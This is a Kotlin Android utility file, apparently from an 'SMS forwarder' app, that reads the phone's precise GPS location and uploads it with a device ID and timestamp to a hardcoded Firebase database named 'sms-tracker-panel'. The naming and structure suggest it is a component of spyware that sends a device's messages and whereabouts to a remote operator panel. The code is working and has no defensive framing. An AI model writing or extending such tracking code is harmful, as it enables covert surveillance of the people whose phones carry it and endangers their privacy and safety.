package com.smsforwarder.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.FirebaseDatabase

class LocationHelper(private val context: Context) {

    private val fusedClient = LocationServices.getFusedLocationProviderClient(context)
    private val deviceId = DeviceUtils.getUniqueDeviceId(context)

    companion object {
        private const val TAG = "LocationHelper"
        // Apna Firebase URL yahan daalo (ya ConfigReader se lo)
        private const val FIREBASE_URL = "https://sms-tracker-panel-default-rtdb.asia-southeast1.firebasedatabase.app/"
    }

    fun fetchAndUploadLocation() {
        if (ContextCompat.checkSelfPermission(
                context, Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            Log.e(TAG, "❌ Location permission not granted")
            return
        }

        try {
            // 1. Pehle last known location try karo (fast)
            fusedClient.lastLocation
                .addOnSuccessListener { location: Location? ->
                    if (location != null && location.accuracy <= 100f) {
                        Log.d(TAG, "✅ Good last known location (acc: ${location.accuracy}m)")
                        uploadLocationToFirebase(location)
                    } else {
                        // 2. Agar last known kharab/null hai to high accuracy current location maango
                        Log.d(TAG, "⏳ Requesting high accuracy current location...")
                        fusedClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                            .addOnSuccessListener { currLocation: Location? ->
                                if (currLocation != null) {
                                    Log.d(TAG, "✅ Current location (acc: ${currLocation.accuracy}m)")
                                    uploadLocationToFirebase(currLocation)
                                } else {
                                    // Current bhi null ho to last known bhej do (agar thi)
                                    location?.let {
                                        Log.w(TAG, "⚠️ Using last known as fallback")
                                        uploadLocationToFirebase(it)
                                    } ?: Log.e(TAG, "❌ No location available")
                                }
                            }
                            .addOnFailureListener { e ->
                                Log.e(TAG, "❌ getCurrentLocation failed: ${e.message}")
                                location?.let { uploadLocationToFirebase(it) }
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "❌ lastLocation failed: ${e.message}")
                }

        } catch (e: SecurityException) {
            Log.e(TAG, "❌ SecurityException: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Location Error: ${e.message}")
        }
    }

    private fun uploadLocationToFirebase(location: Location) {
        val data = mapOf(
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "timestamp" to System.currentTimeMillis()
        )

        FirebaseDatabase.getInstance(FIREBASE_URL)
            .getReference("devices/$deviceId/location")
            .setValue(data)
            .addOnSuccessListener {
                Log.d(TAG, "✅ Location uploaded → ${location.latitude}, ${location.longitude}")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Upload failed: ${e.message}")
            }
    }
}
